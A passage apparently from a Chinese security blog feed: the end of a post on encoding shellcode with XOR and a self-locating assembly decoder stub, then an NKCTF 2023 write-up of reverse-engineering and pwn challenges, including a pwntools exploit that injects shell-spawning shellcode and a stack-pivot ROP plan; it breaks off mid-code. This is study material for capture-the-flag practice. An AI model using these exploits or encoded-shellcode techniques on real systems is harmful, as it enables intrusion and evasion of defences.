<span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">&quot;nkey = 0x%02x\n&quot;</span>, nkey);</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">&quot;shell len = %d\n&quot;</span>, shelllen);</span><br><span class="line"><span class="built_in">fprintf</span>(fp,<span class="string">&quot;\\\n\&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shelllen; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">&quot;\\x%02x&quot;</span>, encodebuff[i]);</span><br><span class="line"><span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">&quot;\&quot; \\\n\&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br><span class="line"><span class="keyword">delete</span>[] encodebuff;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><p>对于输入的shellcode需要一段代码对其进行解码，这里会涉及到偏移问题，如下图所示；</p><p><img src="https://s2.loli.net/2023/06/19/blNtF74yEOmQnxg.png" alt="offset"></p><p>对于获取执行代码的地址，有一个非常经典的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call next_ins</span><br><span class="line">next_ins:</span><br><span class="line">pop eax</span><br></pre></td></tr></table></figure><p>将eip压入栈，再弹出给eax寄存器，此时返回的地址则是pop eax这一条指令所在位置；</p><p>但问题出现在call next_ins，其硬编码会变成 E8 00 00 00，不能有\x00，所以代码需要改变为如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">40000</span> call <span class="number">40003</span>h</span><br><span class="line"><span class="number">40004</span> retn</span><br><span class="line"><span class="number">40005</span> pop eax</span><br></pre></td></tr></table></figure><p>此时40003地址的一字节和40004的retn指令硬编码共同组成两字节的汇编指令：inc ebx，这对实现解码来说无影响，执行这条指令后便pop rax了，且避免了产生\x00，此时返回的地址则是 40004 retn 这个地方；</p><p>此时解码汇编如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">xor</span> eax, eax<span class="comment">//清零eax</span></span><br><span class="line">call tag_get_eip<span class="number">-1</span><span class="comment">//获取retn处地址</span></span><br><span class="line">tag_get_eip:</span><br><span class="line">retn</span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line">lea esi, [eax + offset]<span class="comment">//通过本段汇编码长度得到shellcode地址</span></span><br><span class="line"><span class="keyword">xor</span> ecx, ecx</span><br><span class="line">mov cx, count<span class="comment">//循环次数，shellcode长度</span></span><br><span class="line"></span><br><span class="line">tag_decode:</span><br><span class="line">mov al, [esi + ecx]<span class="comment">//循环解码，倒序</span></span><br><span class="line"><span class="keyword">xor</span> al, key</span><br><span class="line">mov [esi + ecx], al</span><br><span class="line">loop tag_decode</span><br><span class="line"><span class="keyword">xor</span> [esi + ecx], key<span class="comment">//解码漏了的第一个字节</span></span><br><span class="line"></span><br><span class="line">jmp esi                         <span class="comment">//转到shellcode地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;内联汇编&quot;&gt;&lt;a href=&quot;#内联汇编&quot; class=&quot;headerlink&quot; title=&quot;内联汇编&quot;&gt;&lt;/a&gt;内联汇编&lt;/h2&gt;&lt;p&gt;VS编写壳代码需要用到裸函数，在其中使用内联汇编：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;t</summary>
      
    
    
    
    <category term="Diary" scheme="https://secondbc.github.io/SecondBC/categories/Diary/"/>
    
    
    <category term="Bin" scheme="https://secondbc.github.io/SecondBC/tags/Bin/"/>
    
  </entry>
  
  <entry>
    <title>NKCTF 2023 Bin部分复现</title>
    <link href="https://secondbc.github.io/SecondBC/2023/04/14/NKCTF-2023-Bin%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <id>https://secondbc.github.io/SecondBC/2023/04/14/NKCTF-2023-Bin%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-04-14T04:10:24.000Z</published>
    <updated>2023-04-14T04:11:35.280Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="try-decrypt-me"><a href="#try-decrypt-me" class="headerlink" title="try_decrypt_me"></a>try_decrypt_me</h3><p>一道安卓逆向；</p><p>jadx打开查看其MainActivity：</p><p><img src="https://s2.loli.net/2023/03/27/JoZBaRYx9FE2egb.png" alt="Android"></p><p>最上面的函数说明主要逻辑就是用了一个AES加密输入内容；</p><p>最下面的图说明其采用的AES模式；</p><p>而中间说明其传入的密钥是字符串 reversehavemagic 进行了md5加密，且该加密有偏移量iv；</p><p>问题出现在最后的字符串比较上，这个r4点不开；</p><p>怎么拿到比较字符串呢？</p><p>按TAB打开汇编界面，找到比较的对应行数50，之后可看到它实际上是将 secret字段传入了r4里，现在直接搜索secret便可看到一串由base64加密的字符串，这说明经过AES加密后还进行了base64编码，因为字符不可见；</p><p><img src="https://s2.loli.net/2023/03/27/CydRDOsoB9n5XqV.png" alt="find_secret"></p><p>那么此时就有密文：secretbase64解码后的hex；</p><p>密钥：reversehavemagic MD5加密后的hex组成的字串；</p><p>偏移量iv：r3v3rs3car3fully；</p><p>将这些数据直接写进在线网址的AES解密里便可拿到flag：</p><p><strong>NKCTF{nI_k@i_sHi_zhu_j1an_il_Jie_RE_le}</strong></p><h3 id="PMKF"><a href="#PMKF" class="headerlink" title="PMKF"></a>PMKF</h3><p>打开IDA：</p><p>发现是读取C盘下的一个叫做nk.ctf里的二进制文件；</p><p>用里面的数据来加工之后对比数据；</p><p>可以看出开头的6个数据为(byte_405100为nkman)</p><p><code>\x05nkman</code>；</p><p><img src="https://s2.loli.net/2023/03/29/oQBesvnlzkmwGcR.png" alt="main"></p><p>可以发现后面的数据都是进行了迷宫操作：（左图操作数据移动）（右上判断撞墙或者赢）</p><p><img src="https://s2.loli.net/2023/03/29/93AReLycZ6JVSlg.png" alt="maze"></p><p>首先将读入的数据异或后以byte进行&gt;&gt;k &amp; 3的运算；然后根据其为0，1，2，3进行上下左右的移动，因为是+=18 -=18的缘故，这个迷宫数组（右下图）可以用每行18来对齐，之后可以很容易找出迷宫的移动轨迹，顺势推出0123的组合：</p><p><code>1122332212232211011111010000010112110111222323303323221111122333</code>；</p><p>调试可以得到异或的v11是个固定的数据：21；</p><p>则可写出python脚本用z3求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">ans = [BitVec(<span class="string">&#x27;ans[%d]&#x27;</span> % i,<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">aim = <span class="string">&#x27;1122332212232211011111010000010112110111222323303323221111122333&#x27;</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    xored = ans[i] ^ <span class="number">21</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,-<span class="number">1</span>,-<span class="number">2</span>):</span><br><span class="line">        s.add((xored &gt;&gt; j) &amp; <span class="number">3</span> == <span class="built_in">ord</span>(aim[k]) - <span class="number">48</span>)</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到ans之后再跑一遍如下得到16个hex</span></span><br><span class="line">ans = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">ans[<span class="number">10</span>] = <span class="number">190</span></span><br><span class="line">ans[<span class="number">0</span>] = <span class="number">79</span></span><br><span class="line">ans[<span class="number">14</span>] = <span class="number">67</span></span><br><span class="line">ans[<span class="number">4</span>] = <span class="number">0</span></span><br><span class="line">ans[<span class="number">1</span>] = <span class="number">239</span></span><br><span class="line">ans[<span class="number">11</span>] = <span class="number">169</span></span><br><span class="line">ans[<span class="number">2</span>] = <span class="number">126</span></span><br><span class="line">ans[<span class="number">13</span>] = <span class="number">176</span></span><br><span class="line">ans[<span class="number">8</span>] = <span class="number">112</span></span><br><span class="line">ans[<span class="number">12</span>] = <span class="number">238</span></span><br><span class="line">ans[<span class="number">5</span>] = <span class="number">68</span></span><br><span class="line">ans[<span class="number">3</span>] = <span class="number">176</span></span><br><span class="line">ans[<span class="number">15</span>] = <span class="number">170</span></span><br><span class="line">ans[<span class="number">6</span>] = <span class="number">21</span></span><br><span class="line">ans[<span class="number">9</span>] = <span class="number">0</span></span><br><span class="line">ans[<span class="number">7</span>] = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;0%x&#x27;</span> % i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%x&quot;</span> % i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag要求包裹nk.ctf里的十六进制内容，则flag：</p><p><strong>nkctf{056e6b6d616e4fef7eb0004415047000bea9eeb043aa}</strong></p><h3 id="not-a-like"><a href="#not-a-like" class="headerlink" title="not_a_like"></a>not_a_like</h3><p>打开之后可以很清楚的发现这是upx打包之后的结果，函数太少了，结构也和upx很像；</p><p>但是直接用upx -d是没办法解开的，猜测是更改了upx标识码；</p><p>010editor打开搜索upx：</p><p>会发现如下有很多大小写共存的upx，但直接改写会导致这个程序错误；</p><p><img src="https://s2.loli.net/2023/03/29/LTWkofJPuOD9mKp.png" alt="upx"></p><p>自实现一个标准的upx加密，对照着来看，可以发现，正规upx加密的一个区域里有 UPX0 UPX1 UPX2；</p><p>自然可以在这道题里找到对应的区域，只是这里的UPX标志都被改成0了；写回去之后便可用upx -d脱壳了；</p><p>注意只改UPX0-3，不要直接复制会有问题；</p><p>之后再打开ida查看，会发现有很多py函数，推测这是python打包的exe，于是又用pyinstxtractor来解包，很幸运没有key参；最后从pyc使用uncompyle6变为原始的py文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: not_a_like.py</span></span><br><span class="line"><span class="comment"># Compiled at: 1995-09-28 00:18:56</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 272 bytes</span></span><br><span class="line"><span class="keyword">import</span> libnum, base64, hashlib</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text</span>):</span></span><br><span class="line">    data_xor_iv = <span class="built_in">bytearray</span>()</span><br><span class="line">    sbox = []</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    x = y = k = <span class="number">0</span></span><br><span class="line">    key = <span class="string">&#x27;911dcd09ad021d68780e3efed1aa8549&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        sbox.append(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = j + sbox[i] + <span class="built_in">ord</span>(key[(i % <span class="built_in">len</span>(key))]) &amp; <span class="number">255</span></span><br><span class="line">            sbox[i], sbox[j] = sbox[j], sbox[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> idx <span class="keyword">in</span> text:</span><br><span class="line">                x = x + <span class="number">1</span> &amp; <span class="number">255</span></span><br><span class="line">                y = y + sbox[x] &amp; <span class="number">255</span></span><br><span class="line">                sbox[x], sbox[y] = sbox[y], sbox[x]</span><br><span class="line">                k = sbox[(sbox[x] + sbox[y] &amp; <span class="number">255</span>)]</span><br><span class="line">                data_xor_iv.append(idx ^ k)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> data_xor_iv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;请输入flag&gt; &#x27;</span>)</span><br><span class="line">    pub_key = [<span class="number">19252067118061066631831653736874168743759225404757996498452383337816071866700225650384181012362739758314516273574942119597579042209488383895276825193118297972030907899188520426741919737573230050112614350868516818112742663713344658825493377512886311960823584992531185444207705213109184076273376878524090762327</span>, <span class="number">76230002233243117494160925838103007078059987783012242668154928419914737829063294895922280964326704163760912076151634681903538211391318232043295054505369037037489356790665952040424073700340441976087746298068796807069622346676856605244662923296325332812844754859450419515772460413762564695491785275009170060931</span>]</span><br><span class="line">    m = libnum.s2n(flag)</span><br><span class="line">    c = <span class="built_in">str</span>(<span class="built_in">pow</span>(m, pub_key[<span class="number">0</span>], pub_key[<span class="number">1</span>]))</span><br><span class="line">    q = <span class="string">b&#x27;EeJWrgtF+5ue9MRiq7drUAFPtrLATlBZMBW2CdWHRN73Hek7DPVIYDHtMIAfTcYiEV87W7poChqpyUXYI3+/zf5yyDOyE9ARLfa5qilXggu60lmQzFqvFv+1uOaeI2hs2wx+QZtxqGZzC0VCVWvbTQ52nA2UdUtnk8VezRMPMfmf7rOqPxDTv/aacLnI3RdLG2TbT52qtN4+naejI7Xe8HLOL765OZKdDBERKwd5ARQ3UL6YPbuOKOQahIFddnIX6rZ7dTNqCUDOjfJbMdrzJVDNjmNlkLNtYFo7M65Wfwj6PV5vvtT33FsmH50/YLEasnlCiJujYOgi2KCdf5msz1dPEvrXDDL6Csnjo+6m/44RzlluzcqMS5ZJFdrHEh68LIqtu+HCO+69Dyq4e22APq8wgN9kU6R8kikXSn/Ej0N/jOvomFCbkHskRl8xP1KgWFW0SMVDlaDCM4EKG812VgDWgSYOUnVhVpz65uOtg4Z8PrPI+BW4398dQYhD24D9EIPgvtmhNrHiEHouB46ElTGQgZBhtn6y9tL1sw==&#x27;</span></span><br><span class="line">    v = encrypt(base64.b64encode(c.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    v = base64.b64encode(v)</span><br><span class="line">    <span class="keyword">if</span> v == q:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;You are right!&#x27;</span>)</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;winer winer winnie dinner&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Do you think the encryption and decryption are the same?&#x27;</span>)</span><br><span class="line"><span class="comment"># okay decompiling not_a_like.pyc</span></span><br></pre></td></tr></table></figure><p>先是使用rsa加密为一串数字c，然后把c编码base64进行rc4加密，之后再把加密后的v用base64编码，编码后的v与q数据进行比较；</p><p>一路逆回去，只有rsa卡住了一会儿，会发现rsa公钥中的n过大，不好分出p和q，但是e也过大，所以可以用维纳攻击；</p><p>在网上搜索维纳攻击脚本输入对应数据可以解出flag：</p><p><strong>NKCTF{chinese_zhenghan}</strong></p><h3 id="babyrust"><a href="#babyrust" class="headerlink" title="babyrust"></a>babyrust</h3><p>用ida打开查看可以说伪代码相当难看；</p><p>只有用字符串配合着汇编勉强可以看出端倪，且输入数字会产生异常，输入字符会回显一串字符串；</p><p><img src="https://s2.loli.net/2023/03/29/XTxi8SAVvWoDhd9.png" alt="seek"></p><p>可以发现要求输入长度为28，且该输入一一对应，这意味着可以采用按位爆破来解题；</p><p>且它给出了回显，那就更好办了，都不用patch，直接开子进程输入，之后接收回显比较对应字符串；</p><p>先试试吧，它题目给的fake gift比较一下看看结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">real_flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">cur_index=<span class="number">0</span><span class="comment">#当前爆破的位置</span></span><br><span class="line">aim = <span class="string">b&quot;)&amp;n_qFb&#x27;NZXpj)*bLDmLnVj]@^_H&quot;</span> <span class="comment">#给的gift</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> cur_index&lt;<span class="number">28</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#当前爆破的位置上的字符</span></span><br><span class="line">        real_flag_arr = [<span class="number">0</span>] * <span class="number">28</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(real_flag_arr)-<span class="number">1</span>,cur_index,-<span class="number">1</span>):<span class="comment">#除了当前爆破的位置，其他位置 上都设置为 空格</span></span><br><span class="line">            real_flag_arr[j]=<span class="number">32</span></span><br><span class="line"></span><br><span class="line">        real_flag_arr[cur_index]=i<span class="comment">#设置当前爆破的位置上的字符</span></span><br><span class="line">        real_flag_arr_s=<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> real_flag_arr)<span class="comment">#输入到程序中的字符串</span></span><br><span class="line">        p = subprocess.Popen([<span class="string">&quot;C:\\Users\\Second_BC\\Desktop\\babyrust.exe&quot;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">        p.stdin.write(real_flag_arr_s.encode())</span><br><span class="line">        p.stdin.close()</span><br><span class="line">        <span class="comment">#接收输出，第134个刚刚为括号字串</span></span><br><span class="line">        out = p.stdout.read()[<span class="number">134</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="comment">#判断有无返回（只有字符会返回，其他会异常，但也返回一些printf，只是不返回那串括号字串）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(out) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> out[cur_index] == aim[cur_index]:</span><br><span class="line">                real_flag += <span class="built_in">chr</span>(i)</span><br><span class="line">                cur_index += <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(real_flag)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>狠狠地爱一一对应关系的逆向，直接就爆出flag：</p><p><strong>NKCTF{WLcomE_NOWayBaCk_RuST}</strong></p><h3 id="earlier"><a href="#earlier" class="headerlink" title="earlier"></a>earlier</h3><p>两个文件，一个exe一个dll；</p><p>先用ida查看exe，可以发现其很难看：</p><p><img src="https://s2.loli.net/2023/03/29/jpf8ATtCoHg7F9X.png" alt="main_0"></p><p>直接搜索字符串是找不到的，dll里也找不到，猜测是被加密隐藏了；</p><p>直接调会直接闪退，看到export表里面的tls回调函数就知道是怎么一回事了；</p><p>tls一般用于共享内存的多线程处理，但其回调函数是会提前在main之前执行的，所以可以把反调试的内容放里面；</p><p>进去之后看着也是依托答辩：</p><p><img src="https://s2.loli.net/2023/03/29/8TbKod4GUiRs3Jf.png" alt="dabian"></p><p>可以看到最下面是出现了退出进程的，这说明确实反调试就在这一坨，但是上面出现了call坏地址，也同时有短距离的无用跳转；</p><p>可以想到出现了花指令在混淆；</p><p>修复之后：</p><p><img src="https://s2.loli.net/2023/03/29/64QtYCoicF5yswq.png" alt="fixed"></p><p>顺便也把tlscallback_1_0的也修了，就可以发现有三种反调试： IsDebuggerPresent，NtSetInformationThread，NtQueryInformationProcess；</p><p>把对应的地方改了，比如右上图的if(result)改成了if(!result)，下面也同样如此；</p><p>此时就可以调试到main里去了；</p><p>然后main中的三个函数前半段是可以看出逻辑的，但后半段就全部乱了；</p><p><img src="https://s2.loli.net/2023/03/29/nMd3jqkK7JQHGZs.png" alt="image.png"></p><p>但他们三个有共同的特点，在有逻辑的代码段里都调用了同一个函数，把这个函数去花可得到右图；</p><p>而去逆dll可以发现它调用的这两个函数的作用就是把原程序里的这三个函数无逻辑的地方进行异或运算；</p><p>计算完之后就变成正常的函数了，也可以发现之前运行时的字符串了；</p><p>具体逻辑即为rc4加密；进行解密后得到flag：</p><p><strong>nkctf{y0u_are_so_clever_f0r_debug_enc0de!}</strong></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><p><img src="https://s2.loli.net/2023/03/29/jTcIOpbXEza1gJQ.png" alt="shellcode"></p><p>可以发现这个read函数能很容易的实现栈溢出，因为buf距离rbp只有70h，但允许读入100h；</p><p>这个rand实则是个伪随机，默认每次都为一个固定的值，84；</p><p>且输入的内容会被复制到buf2缓冲区上，这个缓冲区在bss段上，此题的bss段是可执行区段，且该题已经直接就把buf2当成函数用了；</p><p>但不能直接输入垃圾代码填充前半段，因为构造的shellcode至少都有40位的长度，buf2缓冲区可没这么长；</p><p>所以要在最开始写入shellcode，然后在执行buf2[v6]的地方写进jmp指令，跳转回buf2[0]的地方执行shellcode；</p><p><strong>Exp代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#别忘了加，不加默认下面构造shellcode是以32位来的</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#后面的一坨jmp偏移可调试获得</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">84</span>,<span class="string">b&#x27;a&#x27;</span>) + <span class="string">b&#x27;\xe9\xa7\xff\xff\xff&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="story"><a href="#story" class="headerlink" title="story"></a>story</h3><p>左图为main函数；</p><p><img src="https://s2.loli.net/2023/03/30/BsH5ufkQLXx8c3N.png" alt="image.png"></p><p>可发现在warning函数中可以拿到puts地址，heart中可实现栈溢出，其他三个函数都是可在bss段上分别写入8字节的内容；</p><p>同时可以知道heart函数栈溢出的位数太少了，只够return的位数：0x20-0xA-8 = 0xE(8 + 6)；</p><p>所以想到用栈迁移来弥补覆盖过少的缺点，而构造的提权payload可以就放在bss段的ao上，刚好24个字节3个内容分别为：</p><ol><li>pop_rdi_ret;</li><li>bin_sh_addr;</li><li>system_addr;</li></ol><p>因为是64位程序，需要用rdi寄存器来传入参数；</p><p><code>pop rdi；retn；</code>这串指令可以在csu上找得到，pop r15 的机械码是 41 5F，而5F对应的就是 pop rdi；</p><p>bin_sh和system可以用puts函数地址计算偏移获得；</p><p>栈迁移目标地址就是ao，二次leave指令可以就选在heart函数上，它本身就自带leave；</p><p><strong>Exp代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 